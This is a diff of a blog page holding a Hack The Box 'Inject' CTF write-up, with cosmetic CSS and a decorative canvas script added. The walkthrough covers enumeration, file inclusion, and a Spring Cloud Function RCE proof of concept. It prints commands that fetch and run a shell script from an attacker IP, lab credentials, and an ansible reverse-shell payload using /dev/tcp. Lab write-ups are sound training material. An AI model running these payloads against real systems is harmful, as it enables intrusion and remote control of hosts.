@@ -1,1 +1,411 @@
-<html><head><meta charset="utf-8"></head><body><p>Gobuster results</p><p>/register &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: 200) [Size: 5654]<br>/error &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(Status: 500) [Size: 106]<br>/upload &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: 200) [Size: 1857]<br>/blogs &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(Status: 200) [Size: 5371]<br>/environment &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(Status: 500) [Size: 712]<br>/release_notes &nbsp; &nbsp; &nbsp; &nbsp;(Status: 200) [Size: 1086]<br>/show_image &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: 400) [Size: 194]<br>&nbsp;</p><p>&nbsp;</p><p>Upload directory which accepts only image files. Due to the box name I imagine we can intercept this upload and change the magic bytes to an image file and upload a shell.</p><p><img src="../img/posts/2024-02-10-Inject(HTB)/01-0ce6ea4e3b.jpg"></p><p>&nbsp;</p><p>The show_image page has lfi</p><p><img src="../img/posts/2024-02-10-Inject(HTB)/02-3c32945fc9.png"></p><p>We find a pom.xml file which is for springboot. Reading the file we can see springboot is using version 3.22</p><figure class="image"><img src="../img/posts/2024-02-10-Inject(HTB)/03-4d89776859.jpg"></figure><p>&nbsp;</p><p>springboot 3.22 has an RCE exploit which we download a POC here</p><p>https://www.exploit-db.com/exploits/51577</p><p><img src="../img/posts/2024-02-10-Inject(HTB)/04-21287d6fef.jpg"></p><p>W find creds for phil located at /home/frank/.m2/settings.xml but we cant use them<br>&nbsp;</p><p>phil:DocPhillovestoInject123</p><p><img src="../img/posts/2024-02-10-Inject(HTB)/05-ff20f02cac.jpg"></p><p>&nbsp;</p><p>I tried everything I could to get a shell but I guess I needed to specify the path for it to work properly. I stole this from 0xdf and all he did was specify the tmp path.</p><p>python3 51577.py --url http://10.10.11.204:8080/functionRouter --command "curl 10.10.14.20:8000/simpleshell.sh -o /tmp/test.sh"</p><p>python3 51577.py --url http://10.10.11.204:8080/functionRouter --command "bash /tmp/test.sh"</p><p><img src="../img/posts/2024-02-10-Inject(HTB)/06-7164d4eb8f.jpg"></p><p>&nbsp;</p><p>Interesting linpeas stuff from phil</p><p><s>/usr/share/bleachbit/cleaners/filezilla.xml</s></p><p><s>/usr/lib/python3/dist-packages/ansible_collections/junipernetworks/junos/tests/integration/targets/junos_config/templates/basic/config.xml</s><br><s>/usr/lib/python3/dist-packages/ansible_collections/community/windows/tests/integration/targets/win_xml/files/config.xml</s></p><p>Nothing good from phil</p><p>&nbsp;</p><p>Linpeas stuff from frank</p><p><s>/etc/nginx/fastcgi_params</s><br><s>/usr/share/keyrings</s></p><p><s>/usr/bin/at &nbsp;---&gt; &nbsp;RTru64_UNIX_4.0g(CVE-2002-1614)</s><br><s>/tmp/hsperfdata_frank/811</s></p><p>&nbsp;</p><p>pspy stuff</p><p>/usr/bin/python3 /usr/bin/ansible-playbook /opt/automation/tasks/playbook_1.yml</p><p>&nbsp;</p><p><span style="color:hsl(0, 75%, 60%);">/bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml</span></p><p>this command seems to run automatically with a wildcard. I think we can exploit it.</p><p>I was right, we find a template online for a ansible reverse shell and create a pwn.yml file. The script automatically goes to that directory and runs all .yml files as root so we can have it run our reverse shell and drop a shell as root.</p><p>&nbsp;</p><p>ansible reverse shell template as a .yml file</p><p>- hosts: localhost<br>&nbsp;tasks:<br>&nbsp;- name: rev<br>&nbsp; &nbsp;shell: bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.20/9999 0&gt;&amp;1'</p><p>here I created the script</p><p><img src="../img/posts/2024-02-10-Inject(HTB)/07-6297627685.png"></p><p>&nbsp;</p><p>we wait a couple minutes for the cronjob to run</p><p><img src="../img/posts/2024-02-10-Inject(HTB)/08-c5172f3b29.png"></p></body></html>
+<html><head><meta charset="utf-8">
+    <title>HTB: Inject | HackWithJordan</title><style>
+        :root {
+            --bg: #0b0e14;
+            --accent: #5eead4;
+            --violet: #7c8cf8;
+            --text: #e8edf2;
+            --muted: #8b97a6;
+            --surface: rgba(255, 255, 255, .04);
+            --border: rgba(255, 255, 255, .09);
+            --accent-dim: rgba(94, 234, 212, .14);
+            --border-hover: rgba(94, 234, 212, .45);
+            --sans: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            --mono: 'Cascadia Code', 'JetBrains Mono', 'Fira Code', Consolas, monospace;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            background: var(--bg);
+            color: var(--text);
+            font-family: var(--sans);
+            line-height: 1.65;
+            overflow-x: hidden;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        ::selection {
+            background: var(--accent-dim);
+            color: var(--accent);
+        }
+
+        #bg-canvas {
+            position: fixed;
+            inset: 0;
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        .blob {
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(110px);
+            opacity: .5;
+            z-index: 0;
+            pointer-events: none;
+            will-change: transform;
+        }
+
+        .blob-1 {
+            width: 55vw;
+            height: 55vw;
+            top: -20vw;
+            left: -15vw;
+            background: radial-gradient(circle, rgba(94, 234, 212, .16), transparent 70%);
+            animation: drift1 26s ease-in-out infinite alternate;
+        }
+
+        .blob-2 {
+            width: 48vw;
+            height: 48vw;
+            bottom: -18vw;
+            right: -12vw;
+            background: radial-gradient(circle, rgba(124, 140, 248, .16), transparent 70%);
+            animation: drift2 32s ease-in-out infinite alternate;
+        }
+
+        .blob-3 {
+            width: 34vw;
+            height: 34vw;
+            top: 40%;
+            left: 55%;
+            background: radial-gradient(circle, rgba(94, 234, 212, .10), transparent 70%);
+            animation: drift3 22s ease-in-out infinite alternate;
+        }
+
+        @keyframes drift1 {
+            from { transform: translate(0, 0) scale(1); }
+            to { transform: translate(6vw, 4vw) scale(1.15); }
+        }
+
+        @keyframes drift2 {
+            from { transform: translate(0, 0) scale(1); }
+            to { transform: translate(-5vw, -6vw) scale(1.1); }
+        }
+
+        @keyframes drift3 {
+            from { transform: translate(0, 0) scale(1); }
+            to { transform: translate(-4vw, 5vw) scale(.9); }
+        }
+
+        article.post {
+            position: relative;
+            z-index: 1;
+            width: 100%;
+            max-width: 860px;
+            margin: 0 auto;
+            padding: 96px 28px 80px;
+        }
+
+        .post-header {
+            border-bottom: 2px solid var(--violet);
+            padding-bottom: 18px;
+            margin-bottom: 36px;
+        }
+
+        .post-header h1 {
+            font-size: 2.1rem;
+            line-height: 1.2;
+            color: var(--violet);
+            font-weight: 700;
+            letter-spacing: -0.01em;
+        }
+
+        .post-header .post-meta {
+            color: var(--muted);
+            font-size: 0.95rem;
+            margin-top: 8px;
+            font-family: var(--mono);
+            letter-spacing: 0.3px;
+        }
+
+        .post h1 {
+            color: var(--violet);
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin: 44px 0 14px;
+        }
+
+        .post h2 {
+            color: var(--violet);
+            font-size: 1.25rem;
+            font-weight: 700;
+            margin: 36px 0 12px;
+        }
+
+        .post h3 {
+            color: var(--violet);
+            font-size: 1.1rem;
+            font-weight: 600;
+            margin: 28px 0 10px;
+        }
+
+        .post p {
+            margin: 15px 0;
+        }
+
+        .post a {
+            color: var(--accent);
+            text-decoration: none;
+        }
+
+        .post a:hover {
+            text-decoration: underline;
+        }
+
+        .post img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+            margin: 20px auto;
+            border-radius: 8px;
+            border: 1px solid var(--border);
+        }
+
+        .post figure {
+            margin: 20px 0;
+        }
+
+        .post pre.terminal {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 16px;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            word-break: break-word;
+            font-family: var(--mono);
+            font-size: 0.88rem;
+            line-height: 1.55;
+            margin: 18px 0;
+            color: var(--text);
+        }
+
+        .post code {
+            font-family: var(--mono);
+            font-size: 0.9em;
+            background: var(--surface);
+            padding: 2px 6px;
+            border-radius: 4px;
+            overflow-wrap: anywhere;
+        }
+
+        .post pre code {
+            background: none;
+            padding: 0;
+        }
+
+        .post ul,
+        .post ol {
+            margin: 15px 0 15px 24px;
+        }
+
+        .post li {
+            margin: 6px 0;
+        }
+
+        .post hr {
+            border: none;
+            border-top: 1px solid var(--border);
+            margin: 32px 0;
+        }
+
+        .post table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 18px 0;
+            font-size: 0.95rem;
+        }
+
+        .post th,
+        .post td {
+            border: 1px solid var(--border);
+            padding: 8px 12px;
+            text-align: left;
+        }
+
+        .post th {
+            background: var(--surface);
+            color: var(--violet);
+        }
+
+        @media (max-width: 640px) {
+            article.post {
+                padding: 72px 20px 60px;
+            }
+
+            .post-header h1 {
+                font-size: 1.7rem;
+            }
+        }
+
+        @media (prefers-reduced-motion: reduce) {
+            .blob {
+                animation: none;
+            }
+        }
+    
+        .home-btn {
+            position: fixed;
+            top: 24px;
+            right: 28px;
+            z-index: 5;
+            font-family: var(--mono);
+            font-size: 0.85rem;
+            color: var(--muted);
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            padding: 7px 14px;
+            text-decoration: none;
+            transition: color 0.2s ease, border-color 0.2s ease;
+        }
+        .home-btn:hover {
+            color: var(--accent);
+            border-color: var(--border-hover);
+        }
+</style>
+</head><body>
+    <a class="home-btn" href="../" title="Back to home">~$ cd ~</a>
+    <canvas id="bg-canvas"></canvas>
+    <div class="blob blob-1"></div>
+    <div class="blob blob-2"></div>
+    <div class="blob blob-3"></div>
+
+    <article class="post">
+        <header class="post-header">
+            <h1>HTB: Inject</h1>
+            <div class="post-meta">February 10, 2024 &bull; HTB</div>
+        </header>
+
+<p>Gobuster results</p><p>/register &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: 200) [Size: 5654]<br>/error &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(Status: 500) [Size: 106]<br>/upload &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: 200) [Size: 1857]<br>/blogs &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(Status: 200) [Size: 5371]<br>/environment &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(Status: 500) [Size: 712]<br>/release_notes &nbsp; &nbsp; &nbsp; &nbsp;(Status: 200) [Size: 1086]<br>/show_image &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: 400) [Size: 194]<br>&nbsp;</p><p>&nbsp;</p><p>Upload directory which accepts only image files. Due to the box name I imagine we can intercept this upload and change the magic bytes to an image file and upload a shell.</p><p><img src="../img/posts/2024-02-10-Inject(HTB)/01-0ce6ea4e3b.jpg"></p><p>&nbsp;</p><p>The show_image page has lfi</p><p><img src="../img/posts/2024-02-10-Inject(HTB)/02-3c32945fc9.png"></p><p>We find a pom.xml file which is for springboot. Reading the file we can see springboot is using version 3.22</p><figure class="image"><img src="../img/posts/2024-02-10-Inject(HTB)/03-4d89776859.jpg"></figure><p>&nbsp;</p><p>springboot 3.22 has an RCE exploit which we download a POC here</p><p>https://www.exploit-db.com/exploits/51577</p><p><img src="../img/posts/2024-02-10-Inject(HTB)/04-21287d6fef.jpg"></p><p>W find creds for phil located at /home/frank/.m2/settings.xml but we cant use them<br>&nbsp;</p><p>phil:DocPhillovestoInject123</p><p><img src="../img/posts/2024-02-10-Inject(HTB)/05-ff20f02cac.jpg"></p><p>&nbsp;</p><p>I tried everything I could to get a shell but I guess I needed to specify the path for it to work properly. I stole this from 0xdf and all he did was specify the tmp path.</p><p>python3 51577.py --url http://10.10.11.204:8080/functionRouter --command "curl 10.10.14.20:8000/simpleshell.sh -o /tmp/test.sh"</p><p>python3 51577.py --url http://10.10.11.204:8080/functionRouter --command "bash /tmp/test.sh"</p><p><img src="../img/posts/2024-02-10-Inject(HTB)/06-7164d4eb8f.jpg"></p><p>&nbsp;</p><p>Interesting linpeas stuff from phil</p><p><s>/usr/share/bleachbit/cleaners/filezilla.xml</s></p><p><s>/usr/lib/python3/dist-packages/ansible_collections/junipernetworks/junos/tests/integration/targets/junos_config/templates/basic/config.xml</s><br><s>/usr/lib/python3/dist-packages/ansible_collections/community/windows/tests/integration/targets/win_xml/files/config.xml</s></p><p>Nothing good from phil</p><p>&nbsp;</p><p>Linpeas stuff from frank</p><p><s>/etc/nginx/fastcgi_params</s><br><s>/usr/share/keyrings</s></p><p><s>/usr/bin/at &nbsp;---&gt; &nbsp;RTru64_UNIX_4.0g(CVE-2002-1614)</s><br><s>/tmp/hsperfdata_frank/811</s></p><p>&nbsp;</p><p>pspy stuff</p><p>/usr/bin/python3 /usr/bin/ansible-playbook /opt/automation/tasks/playbook_1.yml</p><p>&nbsp;</p><p><span style="color:hsl(0, 75%, 60%);">/bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml</span></p><p>this command seems to run automatically with a wildcard. I think we can exploit it.</p><p>I was right, we find a template online for a ansible reverse shell and create a pwn.yml file. The script automatically goes to that directory and runs all .yml files as root so we can have it run our reverse shell and drop a shell as root.</p><p>&nbsp;</p><p>ansible reverse shell template as a .yml file</p><p>- hosts: localhost<br>&nbsp;tasks:<br>&nbsp;- name: rev<br>&nbsp; &nbsp;shell: bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.20/9999 0&gt;&amp;1'</p><p>here I created the script</p><p><img src="../img/posts/2024-02-10-Inject(HTB)/07-6297627685.png"></p><p>&nbsp;</p><p>we wait a couple minutes for the cronjob to run</p><p><img src="../img/posts/2024-02-10-Inject(HTB)/08-c5172f3b29.png"></p>
+    </article>
+
+<script>
+        // ---------- Particle background ----------
+        (function () {
+            const canvas = document.getElementById('bg-canvas');
+            const ctx = canvas.getContext('2d');
+            const reduced = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+            const mouse = { x: null, y: null };
+            let particles = [];
+            let w = 0, h = 0;
+
+            function resize() {
+                const dpr = Math.min(window.devicePixelRatio || 1, 2);
+                w = window.innerWidth;
+                h = window.innerHeight;
+                canvas.width = w * dpr;
+                canvas.height = h * dpr;
+                canvas.style.width = w + 'px';
+                canvas.style.height = h + 'px';
+                ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
+                seed();
+            }
+
+            function seed() {
+                const count = Math.min(90, Math.floor((w * h) / 16000));
+                particles = [];
+                for (let i = 0; i < count; i++) {
+                    particles.push({
+                        x: Math.random() * w,
+                        y: Math.random() * h,
+                        vx: (Math.random() - 0.5) * 0.35,
+                        vy: (Math.random() - 0.5) * 0.35,
+                        r: Math.random() * 1.5 + 0.7
+                    });
+                }
+            }
+
+            function draw() {
+                ctx.clearRect(0, 0, w, h);
+
+                for (const p of particles) {
+                    p.x += p.vx;
+                    p.y += p.vy;
+
+                    if (p.x < -20) p.x = w + 20;
+                    if (p.x > w + 20) p.x = -20;
+                    if (p.y < -20) p.y = h + 20;
+                    if (p.y > h + 20) p.y = -20;
+
+                    if (mouse.x !== null) {
+                        const dx = p.x - mouse.x;
+                        const dy = p.y - mouse.y;
+                        const d = Math.hypot(dx, dy);
+                        if (d < 120 && d > 0.001) {
+                            const f = (1 - d / 120) * 0.5;
+                            p.x += (dx / d) * f;
+                            p.y += (dy / d) * f;
+                        }
+                    }
+                }
+
+                for (let i = 0; i < particles.length; i++) {
+                    const a = particles[i];
+                    for (let j = i + 1; j < particles.length; j++) {
+                        const b = particles[j];
+                        const d = Math.hypot(a.x - b.x, a.y - b.y);
+                        if (d < 110) {
+                            ctx.strokeStyle = 'rgba(94, 234, 212, ' + (0.14 * (1 - d / 110)).toFixed(3) + ')';
+                            ctx.lineWidth = 1;
+                            ctx.beginPath();
+                            ctx.moveTo(a.x, a.y);
+                            ctx.lineTo(b.x, b.y);
+                            ctx.stroke();
+                        }
+                    }
+                    if (mouse.x !== null) {
+                        const d = Math.hypot(a.x - mouse.x, a.y - mouse.y);
+                        if (d < 140) {
+                            ctx.strokeStyle = 'rgba(124, 140, 248, ' + (0.18 * (1 - d / 140)).toFixed(3) + ')';
+                            ctx.lineWidth = 1;
+                            ctx.beginPath();
+                            ctx.moveTo(a.x, a.y);
+                            ctx.lineTo(mouse.x, mouse.y);
+                            ctx.stroke();
+                        }
+                    }
+                }
+
+                for (const p of particles) {
+                    ctx.fillStyle = 'rgba(232, 237, 242, 0.5)';
+                    ctx.beginPath();
+                    ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
+                    ctx.fill();
+                }
+            }
+
+            function loop() {
+                if (!document.hidden) draw();
+                requestAnimationFrame(loop);
+            }
+
+            window.addEventListener('resize', resize);
+            window.addEventListener('mousemove', function (e) {
+                mouse.x = e.clientX;
+                mouse.y = e.clientY;
+            });
+            window.addEventListener('mouseleave', function () {
+                mouse.x = null;
+                mouse.y = null;
+            });
+
+            resize();
+            if (reduced) {
+                draw();
+            } else {
+                requestAnimationFrame(loop);
+            }
+        })();
+    </script>
+</body></html>
